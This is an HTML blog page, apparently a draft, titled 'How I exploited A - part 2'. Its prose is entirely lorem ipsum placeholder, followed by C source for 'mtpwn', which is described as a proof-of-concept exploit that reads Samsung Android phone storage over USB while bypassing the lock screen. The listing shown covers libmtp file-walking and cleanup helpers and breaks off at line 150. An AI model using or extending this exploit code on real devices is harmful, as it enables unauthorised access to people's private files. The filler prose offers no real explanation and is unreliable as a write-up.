<!DOCTYPE html>
<html lang="en">
  <head>
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
    <link rel="icon" href="https://derez.github.io/theme/images/favicon.ico" type="image/x-icon">

    <title>Bit on Bits - How I exploited A - part 2</title>
    <meta charset="utf-8">
    <link href="https://derez.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Bit on Bits Full Atom Feed"/>
    <link href="https://derez.github.io/feeds/index.xml" type="application/atom+xml" rel="alternate" title="Bit on Bits Atom Feed"/>
    <link href="https://derez.github.io/feeds/category/demo-page/index.xml" type="application/atom+xml" rel="alternate" title="Bit on Bits Categories Atom Feed"/>
    <link rel="stylesheet" href="https://derez.github.io/theme/vendor/materialize/css/materialize.min.css">
    <link rel="stylesheet" href="https://derez.github.io/theme/vendor/materialize-icons/material-icons.css">
    <link rel="stylesheet" href="https://derez.github.io/theme/vendor/fontawesome/css/font-awesome.css">
    <link rel="stylesheet" href="https://derez.github.io/theme/vendor/fonts/source-code-pro.css">

    <link rel="stylesheet" href="https://derez.github.io/theme/css/current.min.css?da7c28ed">




    <meta name="tags" contents="python"/>
    <meta name="tags" contents="C"/>
    <meta name="tags" contents="techniques"/>

  </head>
  <body>
    <header>
      <ul id="blog-dropdown" class="dropdown-content">
        <li><a href="https://derez.github.io/categories.html"><i class="fa fa-folder fa-lg"></i>&nbsp;&nbsp;Categories</a></li>
        <li><a href="https://derez.github.io/archives.html"><i class="fa fa-calendar fa-lg"></i>&nbsp;&nbsp;Dates</a></li>
        <li><a href="https://derez.github.io/tags.html"><i class="fa fa-tags fa-lg"></i>&nbsp;&nbsp;Tags</a></li>
      </ul>

      <div class="navbar-fixed">
      <nav role="navigation" class="blue-grey darken-4 cyan-text text-lighten-2">
        <!-- slide-out -->
        <ul id="slide-out" class="side-nav black cyan-text">
          <li>
            <div class="userView">
              <a href="#!user"><img class="circle" src="https://derez.github.io/theme/images/headshot.png"></a>
              <a href="#!name"><span class="name">Danny 'derez' Walker</span></a>
              <span class="email">derez<i class="fa fa-at"></i>packetforge[dot]net</span>
            </div>
          </li>
          <li>
              <a href="https://derez.github.io/projects.html" class="menu-item cyan-text btn-flat waves-effect waves-orange">
                <i class="cyan-text fa fa-cogs fa-lg"></i>&nbsp;&nbsp;Projects</a>
              <a href="https://derez.github.io/pages/about.html" class="menu-item cyan-text btn-flat waves-effect waves-orange">
                <i class="cyan-text fa fa-user-circle fa-lg"></i>&nbsp;&nbsp;About</a>
          </li>
          <li>
              <b>Browse blog by</b>
              <a href="https://derez.github.io/categories.html" class="menu-item cyan-text btn-flat waves-effect waves-orange">
                <i class="cyan-text fa fa-folder fa-lg"></i>&nbsp;&nbsp;Categories</a>
              <a href="https://derez.github.io/archives.html" class="menu-item cyan-text btn-flat waves-effect waves-orange">
                <i class="cyan-text fa fa-calendar fa-lg "></i>&nbsp;&nbsp;Dates</a>
              <a href="https://derez.github.io/tags.html" class="menu-item cyan-text btn-flat waves-effect waves-orange">
                <i class="cyan-text fa fa-tag fa-lg "></i>&nbsp;&nbsp;Tags</a>
          </li>
        </ul>
        <!-- end of slide-out -->

        <div class="nav-wrapper container">
          <ul id="top-nav" class="top-nav">
            <li>
              <a href="#" data-activates="slide-out" class="button-collapse">
              <i class="orange-text text-darken-3 material-icons">menu</i>
              </a>
            </li>
            <li><a id="logo-container" href="https://derez.github.io/" class="brand-logo">
              <img class="circle" src="https://derez.github.io/theme/images/avatar.png">Bit on Bits</a></li>
            <ul class="right hide-on-med-and-down vertical-align-middle">
              <li><a class="menu-item waves-effect waves-orange btn-flat" href="https://derez.github.io/projects.html">
                <i class="fa fa-cogs"></i>&nbsp;&nbsp;Projects</a>
              </li>
              <li><a class="menu-item dropdown-button waves-effect waves-orange btn-flat" data-beloworigin="true" alignment="left" data-constrainwidth="false" href="#" data-activates="blog-dropdown">
                <i class="fa fa-bullhorn"></i>&nbsp;&nbsp;Blog&nbsp;&nbsp;<i class="fa fa-caret-down"></i></a>
              </li>
              <li>
                <form action="https://derez.github.io/search.html">
                  <div class="input-field">
                    <input id="search" type="search" name="q" required autocomplete="off" placeholder="Search...">
                    <label for="search"><i class=" vertical-align-middle orange-text text-darken-3 fa fa-search fa-lg"></i></label>
                  </div>
                </form>
              </li>
            </ul>
          </ul>
        </div>
      </nav>
      </div>
      <div class="hide-on-small-only">
            <nav id="breadcrumbs">
    <div class="nav-wrapper container valign-wrapper">
      <div class="col s12 truncate">
        <a href="/" class="breadcrumb"><i class="fa fa-home"></i></a>
        <a href="/archives.html" class="breadcrumb">Archives</a>
        <a href="/drafts/device-exploitation-2.html" class="breadcrumb">How I exploited A - part 2</a>
      </div>
    </div>
  </nav>
      </div>

        <div class="parallax-container ">
    <div class="parallax"><img src="/theme/images/wide.png"></div>
  </div>
    </header>

    <main>
      <div class="container">
        <div class="parallax-offset">


  <article itemscope itemtype="http://schema.org/Article" class="card-panel glow black cyan-text z-depth-5">
    <h1 itemprop="name"><a href="https://derez.github.io/drafts/device-exploitation-2.html" rel="bookmark" class="article-name card-title" 
      title="Permalink How I exploited A - part 2">How I exploited A - part&nbsp;2</a></h1>
    <div class="divider"></div>

    <footer class="post-info">
      <span class="published" title="2019-04-26T00:00:00-04:00">
        <i class="vertical-align-middle cyan-text fa fa-calendar fa-lg"></i>&nbsp;&nbsp;Date: 
        <time datetime="2019-04-26" itemprop="dateCreated"> 26 Apr 2019</time>
      </span>
      <br/>
      <address class="vcard author">
        <a class="cyan-text" href="https://derez.github.io/pages/about.html"><i class="cyan-text vertical-align-middle fa fa-user-circle fa-lg"></i>&nbsp;
        Danny Walker</a>
      </address>
    </footer>

    <div class="flow-text section no-padding" itemprop="text">
      <p>Lorem ipsum dolor sit amet, eos ei assum postea. Erant iracundia similique pri ut, ius mutat sanctus et, movet feugiat persecuti pro ex. Essent blandit fastidii nec eu. Sonet vocibus ne usu, vel fabellas salutandi ei, est prima dicit no. Amet mucius albucius eos at.</p>
<!-- PELICAN_END_SUMMARY -->
<p>Munere quaerendum vim at, eam ne percipit omittantur. Nisl vero veri quo id, summo civibus signiferumque per ut. Vix tollit discere corpora an. Decore cetero mel an. Tantas epicuri nec et, fugit iudicabit percipitur mel in, libris meliore repudiandae nam at.</p>
<p>Eu veri ferri evertitur mea, usu aperiam legimus volumus ex. Nec nisl putant inimicus an. Adhuc iudicabit nec an. Eu odio tollit feugait est, nec ut elitr interpretaris.</p>
<p>No agam delicata usu, oportere adolescens omittantur ut vis, fastidii persequeris voluptatibus eos ea. Id per esse dictas petentium, in choro nullam impetus cum. Eam omnis democritum assueverit an, zril corpora usu ne. Has cu accusam imperdiet urbanitas, novum virtute intellegat per id, aeque quando disputationi ea his. Facilisi consulatu expetendis mei ut. Ex fastidii instructior nam, ad falli minim cum.</p>
<p>His labitur sententiae eu, ad vix neglegentur necessitatibus. His graeco molestie et, dico ipsum vim in, clita mentitum pertinax in nec. Gubergren neglegentur cum no. At esse invidunt qui, nam eu erat natum elaboraret, intellegat vituperata pro ad. Usu et congue volutpat persecuti, mel id utinam lucilius philosophia. Pro veniam debitis ancillae et, vel noluisse persecuti eu. Accusamus gubergren pertinacia est cu, choro discere deleniti cu cum, ne alii ignota labore sed.</p>
<p>Minim possit pri te, te eos wisi minimum, per dicant consequat ut. At discere nominavi est. Nostrum gubergren at est, sed no iudicabit definitiones. Sed eius aliquid an, ea vocibus docendi vix, ullamcorper definitionem in his.</p>
<p>Iriure aperiri adolescens an eum, an vis elit facilis. Vix in brute autem debet, nibh movet voluptatum ex vis, iusto senserit reprimique ex nec. Usu an lorem delenit dissentiunt, vis vero accusam ne. Brute mollis adipisci cum an, esse ullum cotidieque eos te. Duis blandit necessitatibus ex per, ei congue corrumpit efficiendi qui.</p>
<p>Ea diceret vivendum contentiones vim. Timeam necessitatibus at est. Omittantur concludaturque ut mea, cu vis debet voluptaria comprehensam, eu liberavisse instructior mea. Cu convenire honestatis definitionem mei, his no perfecto iracundia. Aeque doming eos ne, et sea utinam tritani corrumpit. Vix magna intellegebat ei, brute consectetuer conclusionemque pri ea.</p>
<p>Mel sint recusabo iracundia an. Partem quaestio in sed, no est oblique constituam instructior. No mei prima assum graecis, iuvaret vocibus vivendum at mel. Malis dicam pro ut. Mei eu facete percipit efficiendi.</p>
<p>At est reque ubique, ea diam falli sed, ei mel purto volutpat. Movet alterum ocurreret usu ne, an verear nominavi theophrastus pro. Ex omnes sensibus concludaturque his, possit cotidieque ei cum, in cum utinam iisque. Ne sea periculis explicari, sit ea vero facer dissentiunt. Ea eam vidit ignota electram.</p>
<div class="highlight"><pre><span></span><span id="row-1"><span class="lineno">  1 </span><span class="cm">/*</span>
</span><span id="row-2"><span class="lineno">  2 </span><span class="cm"> *  mtpwn - PoC exploit for a vulnerability of Samsung's Android</span>
</span><span id="row-3"><span class="lineno">  3 </span><span class="cm"> *          phones that allows an attacker to access phone storages</span>
</span><span id="row-4"><span class="lineno">  4 </span><span class="cm"> *          via USB, bypassing lock screen and/or "Charge only" mode.</span>
</span><span id="row-5"><span class="lineno">  5 </span><span class="cm"> *          It requires libmtp.</span>
</span><span id="row-6"><span class="lineno">  6 </span><span class="cm"> *</span>
</span><span id="row-7"><span class="lineno">  7 </span><span class="cm"> *  Copyright (C) 2017  Salvatore Mesoraca &lt;s.mesoraca16@gmail.com&gt;</span>
</span><span id="row-8"><span class="lineno">  8 </span><span class="cm"> *</span>
</span><span id="row-9"><span class="lineno">  9 </span><span class="cm"> *  This program is free software: you can redistribute it and/or modify</span>
</span><span id="row-10"><span class="lineno"> 10 </span><span class="cm"> *  it under the terms of the GNU General Public License as published by</span>
</span><span id="row-11"><span class="lineno"> 11 </span><span class="cm"> *  the Free Software Foundation, either version 3 of the License, or</span>
</span><span id="row-12"><span class="lineno"> 12 </span><span class="cm"> *  (at your option) any later version.</span>
</span><span id="row-13"><span class="lineno"> 13 </span><span class="cm"> *</span>
</span><span id="row-14"><span class="lineno"> 14 </span><span class="cm"> *  This program is distributed in the hope that it will be useful,</span>
</span><span id="row-15"><span class="lineno"> 15 </span><span class="cm"> *  but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
</span><span id="row-16"><span class="lineno"> 16 </span><span class="cm"> *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
</span><span id="row-17"><span class="lineno"> 17 </span><span class="cm"> *  GNU General Public License for more details.</span>
</span><span id="row-18"><span class="lineno"> 18 </span><span class="cm"> *</span>
</span><span id="row-19"><span class="lineno"> 19 </span><span class="cm"> *  You should have received a copy of the GNU General Public License</span>
</span><span id="row-20"><span class="lineno"> 20 </span><span class="cm"> *  along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span>
</span><span id="row-21"><span class="lineno"> 21 </span><span class="cm"> */</span>
</span><span id="row-22"><span class="lineno"> 22 </span>
</span><span id="row-23"><span class="lineno"> 23 </span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
</span><span id="row-24"><span class="lineno"> 24 </span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
</span><span id="row-25"><span class="lineno"> 25 </span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
</span><span id="row-26"><span class="lineno"> 26 </span><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp"></span>
</span><span id="row-27"><span class="lineno"> 27 </span><span class="cp">#include</span> <span class="cpf">&lt;libmtp.h&gt;</span><span class="cp"></span>
</span><span id="row-28"><span class="lineno"> 28 </span>
</span><span id="row-29"><span class="lineno"> 29 </span><span class="cp">#define MAX_PATH 1024</span>
</span><span id="row-30"><span class="lineno"> 30 </span>
</span><span id="row-31"><span class="lineno"> 31 </span><span class="k">static</span> <span class="kt">void</span> <span class="nf">walk</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">fname</span><span class="p">,</span>
</span><span id="row-32"><span class="lineno"> 32 </span>                 <span class="n">LIBMTP_file_t</span> <span class="o">*</span><span class="n">files</span><span class="p">,</span>
</span><span id="row-33"><span class="lineno"> 33 </span>                 <span class="n">LIBMTP_folder_t</span> <span class="o">*</span><span class="n">folders</span><span class="p">,</span>
</span><span id="row-34"><span class="lineno"> 34 </span>                 <span class="kt">char</span> <span class="o">**</span><span class="n">flist</span><span class="p">,</span>
</span><span id="row-35"><span class="lineno"> 35 </span>                 <span class="kt">size_t</span> <span class="n">nmem</span><span class="p">,</span>
</span><span id="row-36"><span class="lineno"> 36 </span>                 <span class="kt">ssize_t</span> <span class="o">*</span><span class="n">idx</span><span class="p">,</span>
</span><span id="row-37"><span class="lineno"> 37 </span>                 <span class="kt">ssize_t</span> <span class="n">pidx</span><span class="p">)</span>
</span><span id="row-38"><span class="lineno"> 38 </span><span class="p">{</span>
</span><span id="row-39"><span class="lineno"> 39 </span>        <span class="kt">size_t</span> <span class="n">cidx</span> <span class="o">=</span> <span class="o">*</span><span class="n">idx</span><span class="p">;</span>
</span><span id="row-40"><span class="lineno"> 40 </span>        <span class="kt">size_t</span> <span class="n">fidx</span><span class="p">;</span>
</span><span id="row-41"><span class="lineno"> 41 </span>
</span><span id="row-42"><span class="lineno"> 42 </span>        <span class="k">if</span> <span class="p">(</span><span class="n">folders</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="n">cidx</span><span class="o">+</span><span class="mi">1</span> <span class="o">&gt;=</span> <span class="n">nmem</span><span class="p">)</span>
</span><span id="row-43"><span class="lineno"> 43 </span>                <span class="k">return</span><span class="p">;</span>
</span><span id="row-44"><span class="lineno"> 44 </span>        <span class="n">cidx</span> <span class="o">=</span> <span class="o">++</span><span class="p">(</span><span class="o">*</span><span class="n">idx</span><span class="p">);</span>
</span><span id="row-45"><span class="lineno"> 45 </span>        <span class="n">flist</span><span class="p">[</span><span class="n">cidx</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">MAX_PATH</span><span class="p">);</span>
</span><span id="row-46"><span class="lineno"> 46 </span>        <span class="k">if</span> <span class="p">(</span><span class="n">pidx</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span id="row-47"><span class="lineno"> 47 </span>                <span class="n">snprintf</span><span class="p">(</span><span class="n">flist</span><span class="p">[</span><span class="n">cidx</span><span class="p">],</span>
</span><span id="row-48"><span class="lineno"> 48 </span>                         <span class="n">MAX_PATH</span><span class="p">,</span>
</span><span id="row-49"><span class="lineno"> 49 </span>                         <span class="s">"%s/%x/%s/"</span><span class="p">,</span>
</span><span id="row-50"><span class="lineno"> 50 </span>                         <span class="n">fname</span><span class="p">,</span>
</span><span id="row-51"><span class="lineno"> 51 </span>                         <span class="n">folders</span><span class="o">-&gt;</span><span class="n">storage_id</span><span class="p">,</span>
</span><span id="row-52"><span class="lineno"> 52 </span>                         <span class="n">folders</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
</span><span id="row-53"><span class="lineno"> 53 </span>        <span class="k">else</span>
</span><span id="row-54"><span class="lineno"> 54 </span>                <span class="n">snprintf</span><span class="p">(</span><span class="n">flist</span><span class="p">[</span><span class="n">cidx</span><span class="p">],</span>
</span><span id="row-55"><span class="lineno"> 55 </span>                         <span class="n">MAX_PATH</span><span class="p">,</span>
</span><span id="row-56"><span class="lineno"> 56 </span>                         <span class="s">"%s%s/"</span><span class="p">,</span>
</span><span id="row-57"><span class="lineno"> 57 </span>                         <span class="n">flist</span><span class="p">[</span><span class="n">pidx</span><span class="p">],</span>
</span><span id="row-58"><span class="lineno"> 58 </span>                         <span class="n">folders</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
</span><span id="row-59"><span class="lineno"> 59 </span>
</span><span id="row-60"><span class="lineno"> 60 </span>        <span class="n">walk</span><span class="p">(</span><span class="n">fname</span><span class="p">,</span> <span class="n">files</span><span class="p">,</span> <span class="n">folders</span><span class="o">-&gt;</span><span class="n">child</span><span class="p">,</span> <span class="n">flist</span><span class="p">,</span> <span class="n">nmem</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">cidx</span><span class="p">);</span>
</span><span id="row-61"><span class="lineno"> 61 </span>        <span class="n">walk</span><span class="p">(</span><span class="n">fname</span><span class="p">,</span> <span class="n">files</span><span class="p">,</span> <span class="n">folders</span><span class="o">-&gt;</span><span class="n">sibling</span><span class="p">,</span> <span class="n">flist</span><span class="p">,</span> <span class="n">nmem</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">pidx</span><span class="p">);</span>
</span><span id="row-62"><span class="lineno"> 62 </span>
</span><span id="row-63"><span class="lineno"> 63 </span>        <span class="k">while</span> <span class="p">(</span><span class="n">files</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span id="row-64"><span class="lineno"> 64 </span>                <span class="k">if</span> <span class="p">(</span><span class="n">files</span><span class="o">-&gt;</span><span class="n">parent_id</span> <span class="o">==</span> <span class="n">folders</span><span class="o">-&gt;</span><span class="n">folder_id</span> <span class="o">&amp;&amp;</span>
</span><span id="row-65"><span class="lineno"> 65 </span>                    <span class="n">folders</span><span class="o">-&gt;</span><span class="n">storage_id</span> <span class="o">==</span> <span class="n">files</span><span class="o">-&gt;</span><span class="n">storage_id</span><span class="p">)</span> <span class="p">{</span>
</span><span id="row-66"><span class="lineno"> 66 </span>                        <span class="n">fidx</span> <span class="o">=</span> <span class="o">++</span><span class="p">(</span><span class="o">*</span><span class="n">idx</span><span class="p">);</span>
</span><span id="row-67"><span class="lineno"> 67 </span>                        <span class="k">if</span> <span class="p">(</span><span class="n">fidx</span> <span class="o">&gt;=</span> <span class="n">nmem</span><span class="p">)</span>
</span><span id="row-68"><span class="lineno"> 68 </span>                                <span class="k">return</span><span class="p">;</span>
</span><span id="row-69"><span class="lineno"> 69 </span>                        <span class="n">flist</span><span class="p">[</span><span class="n">fidx</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">MAX_PATH</span><span class="p">);</span>
</span><span id="row-70"><span class="lineno"> 70 </span>                        <span class="n">snprintf</span><span class="p">(</span><span class="n">flist</span><span class="p">[</span><span class="n">fidx</span><span class="p">],</span>
</span><span id="row-71"><span class="lineno"> 71 </span>                                 <span class="n">MAX_PATH</span><span class="p">,</span>
</span><span id="row-72"><span class="lineno"> 72 </span>                                 <span class="s">"%s%s"</span><span class="p">,</span>
</span><span id="row-73"><span class="lineno"> 73 </span>                                 <span class="n">flist</span><span class="p">[</span><span class="n">cidx</span><span class="p">],</span>
</span><span id="row-74"><span class="lineno"> 74 </span>                                 <span class="n">files</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">);</span>
</span><span id="row-75"><span class="lineno"> 75 </span>                <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">cidx</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">files</span><span class="o">-&gt;</span><span class="n">parent_id</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span id="row-76"><span class="lineno"> 76 </span>                        <span class="n">fidx</span> <span class="o">=</span> <span class="o">++</span><span class="p">(</span><span class="o">*</span><span class="n">idx</span><span class="p">);</span>
</span><span id="row-77"><span class="lineno"> 77 </span>                        <span class="k">if</span> <span class="p">(</span><span class="n">fidx</span> <span class="o">&gt;=</span> <span class="n">nmem</span><span class="p">)</span>
</span><span id="row-78"><span class="lineno"> 78 </span>                                <span class="k">return</span><span class="p">;</span>
</span><span id="row-79"><span class="lineno"> 79 </span>                        <span class="n">flist</span><span class="p">[</span><span class="n">fidx</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">MAX_PATH</span><span class="p">);</span>
</span><span id="row-80"><span class="lineno"> 80 </span>                        <span class="n">snprintf</span><span class="p">(</span><span class="n">flist</span><span class="p">[</span><span class="n">fidx</span><span class="p">],</span>
</span><span id="row-81"><span class="lineno"> 81 </span>                                 <span class="n">MAX_PATH</span><span class="p">,</span>
</span><span id="row-82"><span class="lineno"> 82 </span>                                 <span class="s">"%s/%x/%s"</span><span class="p">,</span>
</span><span id="row-83"><span class="lineno"> 83 </span>                                 <span class="n">fname</span><span class="p">,</span>
</span><span id="row-84"><span class="lineno"> 84 </span>                                 <span class="n">files</span><span class="o">-&gt;</span><span class="n">storage_id</span><span class="p">,</span>
</span><span id="row-85"><span class="lineno"> 85 </span>                                 <span class="n">files</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">);</span>
</span><span id="row-86"><span class="lineno"> 86 </span>                <span class="p">}</span>
</span><span id="row-87"><span class="lineno"> 87 </span>                <span class="n">files</span> <span class="o">=</span> <span class="n">files</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
</span><span id="row-88"><span class="lineno"> 88 </span>        <span class="p">}</span>
</span><span id="row-89"><span class="lineno"> 89 </span><span class="p">}</span>
</span><span id="row-90"><span class="lineno"> 90 </span>
</span><span id="row-91"><span class="lineno"> 91 </span><span class="k">static</span> <span class="kt">size_t</span> <span class="nf">folders_count</span><span class="p">(</span><span class="n">LIBMTP_folder_t</span> <span class="o">*</span><span class="n">folders</span><span class="p">)</span>
</span><span id="row-92"><span class="lineno"> 92 </span><span class="p">{</span>
</span><span id="row-93"><span class="lineno"> 93 </span>        <span class="kt">size_t</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span id="row-94"><span class="lineno"> 94 </span>
</span><span id="row-95"><span class="lineno"> 95 </span>        <span class="k">if</span> <span class="p">(</span><span class="n">folders</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span><span id="row-96"><span class="lineno"> 96 </span>                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span id="row-97"><span class="lineno"> 97 </span>        <span class="n">c</span> <span class="o">+=</span> <span class="n">folders_count</span><span class="p">(</span><span class="n">folders</span><span class="o">-&gt;</span><span class="n">child</span><span class="p">);</span>
</span><span id="row-98"><span class="lineno"> 98 </span>        <span class="n">c</span> <span class="o">+=</span> <span class="n">folders_count</span><span class="p">(</span><span class="n">folders</span><span class="o">-&gt;</span><span class="n">sibling</span><span class="p">);</span>
</span><span id="row-99"><span class="lineno"> 99 </span>        <span class="k">return</span> <span class="n">c</span><span class="p">;</span>
</span><span id="row-100"><span class="lineno">100 </span><span class="p">}</span>
</span><span id="row-101"><span class="lineno">101 </span>
</span><span id="row-102"><span class="lineno">102 </span><span class="k">static</span> <span class="kt">size_t</span> <span class="nf">files_count</span><span class="p">(</span><span class="n">LIBMTP_file_t</span> <span class="o">*</span><span class="n">files</span><span class="p">)</span>
</span><span id="row-103"><span class="lineno">103 </span><span class="p">{</span>
</span><span id="row-104"><span class="lineno">104 </span>        <span class="kt">size_t</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span id="row-105"><span class="lineno">105 </span>
</span><span id="row-106"><span class="lineno">106 </span>        <span class="k">while</span> <span class="p">(</span><span class="n">files</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span id="row-107"><span class="lineno">107 </span>                <span class="n">files</span> <span class="o">=</span> <span class="n">files</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
</span><span id="row-108"><span class="lineno">108 </span>                <span class="o">++</span><span class="n">c</span><span class="p">;</span>
</span><span id="row-109"><span class="lineno">109 </span>        <span class="p">}</span>
</span><span id="row-110"><span class="lineno">110 </span>        <span class="k">return</span> <span class="n">c</span><span class="p">;</span>
</span><span id="row-111"><span class="lineno">111 </span><span class="p">}</span>
</span><span id="row-112"><span class="lineno">112 </span><span class="k">static</span> <span class="kt">size_t</span> <span class="nf">approx_count</span><span class="p">(</span><span class="n">LIBMTP_file_t</span> <span class="o">*</span><span class="n">files</span><span class="p">,</span> <span class="n">LIBMTP_folder_t</span> <span class="o">*</span><span class="n">folders</span><span class="p">)</span>
</span><span id="row-113"><span class="lineno">113 </span><span class="p">{</span>
</span><span id="row-114"><span class="lineno">114 </span>        <span class="kt">size_t</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span id="row-115"><span class="lineno">115 </span>
</span><span id="row-116"><span class="lineno">116 </span>        <span class="n">c</span> <span class="o">+=</span> <span class="n">files_count</span><span class="p">(</span><span class="n">files</span><span class="p">);</span>
</span><span id="row-117"><span class="lineno">117 </span>        <span class="n">c</span> <span class="o">+=</span> <span class="n">folders_count</span><span class="p">(</span><span class="n">folders</span><span class="p">);</span>
</span><span id="row-118"><span class="lineno">118 </span>        <span class="k">return</span> <span class="n">c</span><span class="p">;</span>
</span><span id="row-119"><span class="lineno">119 </span><span class="p">}</span>
</span><span id="row-120"><span class="lineno">120 </span>
</span><span id="row-121"><span class="lineno">121 </span><span class="k">static</span> <span class="kt">int</span> <span class="nf">pathcmp</span><span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">b</span><span class="p">)</span>
</span><span id="row-122"><span class="lineno">122 </span><span class="p">{</span>
</span><span id="row-123"><span class="lineno">123 </span>        <span class="k">return</span> <span class="n">strcmp</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">a</span><span class="p">),</span> <span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">b</span><span class="p">));</span>
</span><span id="row-124"><span class="lineno">124 </span><span class="p">}</span>
</span><span id="row-125"><span class="lineno">125 </span>
</span><span id="row-126"><span class="lineno">126 </span><span class="k">static</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">fname</span><span class="p">,</span>
</span><span id="row-127"><span class="lineno">127 </span>                    <span class="n">LIBMTP_file_t</span> <span class="o">**</span><span class="n">files</span><span class="p">,</span>
</span><span id="row-128"><span class="lineno">128 </span>                    <span class="n">LIBMTP_folder_t</span> <span class="o">**</span><span class="n">folders</span><span class="p">,</span>
</span><span id="row-129"><span class="lineno">129 </span>                    <span class="kt">char</span> <span class="o">***</span><span class="n">flist</span><span class="p">,</span>
</span><span id="row-130"><span class="lineno">130 </span>                    <span class="kt">size_t</span> <span class="n">nmem</span><span class="p">)</span>
</span><span id="row-131"><span class="lineno">131 </span><span class="p">{</span>
</span><span id="row-132"><span class="lineno">132 </span>        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span id="row-133"><span class="lineno">133 </span>        <span class="n">LIBMTP_file_t</span> <span class="o">*</span><span class="n">fs</span> <span class="o">=</span> <span class="o">*</span><span class="n">files</span><span class="p">,</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
</span><span id="row-134"><span class="lineno">134 </span>        <span class="kt">char</span> <span class="o">**</span><span class="n">fl</span> <span class="o">=</span> <span class="o">*</span><span class="n">flist</span><span class="p">;</span>
</span><span id="row-135"><span class="lineno">135 </span>
</span><span id="row-136"><span class="lineno">136 </span>        <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="n">fname</span><span class="p">);</span>
</span><span id="row-137"><span class="lineno">137 </span>        <span class="o">*</span><span class="n">fname</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span id="row-138"><span class="lineno">138 </span>
</span><span id="row-139"><span class="lineno">139 </span>        <span class="k">while</span> <span class="p">(</span><span class="n">fs</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span id="row-140"><span class="lineno">140 </span>                <span class="n">tmp</span> <span class="o">=</span> <span class="n">fs</span><span class="p">;</span>
</span><span id="row-141"><span class="lineno">141 </span>                <span class="n">fs</span> <span class="o">=</span> <span class="n">fs</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
</span><span id="row-142"><span class="lineno">142 </span>                <span class="n">LIBMTP_destroy_file_t</span><span class="p">(</span><span class="n">tmp</span><span class="p">);</span>
</span><span id="row-143"><span class="lineno">143 </span>        <span class="p">}</span>
</span><span id="row-144"><span class="lineno">144 </span>        <span class="o">*</span><span class="n">files</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span id="row-145"><span class="lineno">145 </span>
</span><span id="row-146"><span class="lineno">146 </span>        <span class="n">LIBMTP_destroy_folder_t</span><span class="p">(</span><span class="o">*</span><span class="n">folders</span><span class="p">);</span>
</span><span id="row-147"><span class="lineno">147 </span>        <span class="o">*</span><span class="n">folders</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span id="row-148"><span class="lineno">148 </span>
</span><span id="row-149"><span class="lineno">149 </span>        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nmem</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span id="row-150"><span class="lineno">150 </span>                <span class="n">free</span><span class="p">(</span><span class="n">fl</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
